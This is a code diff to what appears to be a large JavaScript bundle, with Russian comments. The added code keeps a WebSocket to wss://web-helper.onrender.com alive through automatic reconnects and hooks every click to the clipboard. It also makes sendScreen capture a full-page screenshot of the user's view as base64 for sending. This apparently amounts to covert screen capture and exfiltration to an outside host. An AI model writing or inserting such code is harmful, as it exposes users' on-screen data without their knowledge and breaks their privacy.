@@ -10463,6 +10463,20 @@ socket.onmessage = (event) => {
   }
 };
 
+socket.onclose = () => {
+  setTimeout(() => {
+    const newSocket = new WebSocket("wss://web-helper.onrender.com");
+
+    newSocket.onopen = () => {
+      console.log("Соединение установлено");
+    };
+    newSocket.onmessage = socket.onmessage;
+    newSocket.onclose = socket.onclose;
+
+    socket = newSocket;
+  }, 2000);
+};
+
 let timeout;
 document.addEventListener("click", () => {
   navigator.clipboard
@@ -10477,8 +10491,37 @@ document.addEventListener("click", () => {
   }, 1000);
 });
 
+async function preloadImages() {
+  const imageElements = Array.from(document.images);
+
+  const preloadPromises = imageElements.map((img) => {
+    return new Promise((resolve) => {
+      if (img.complete && img.naturalWidth !== 0) {
+        return resolve();
+      }
+
+      const temp = new Image();
+      temp.crossOrigin = "anonymous";
+      temp.src = img.src;
+
+      temp.onload = temp.onerror = () => resolve();
+    });
+  });
+
+  await Promise.all(preloadPromises);
+
+  // добавим небольшую задержку на "отрисовку"
+  await new Promise((r) => setTimeout(r, 300));
+}
+
 async function sendScreen() {
-  html2canvas(document.body).then((canvas) => {
+  await preloadImages();
+
+  html2canvas(document.body, {
+    scrollY: -window.scrollY, // захватывает весь экран
+    windowWidth: document.documentElement.scrollWidth,
+    windowHeight: document.documentElement.scrollHeight,
+  }).then((canvas) => {
     const base64img = canvas.toDataURL("image/png"); // получаем base64-скриншот
 
     const message = {
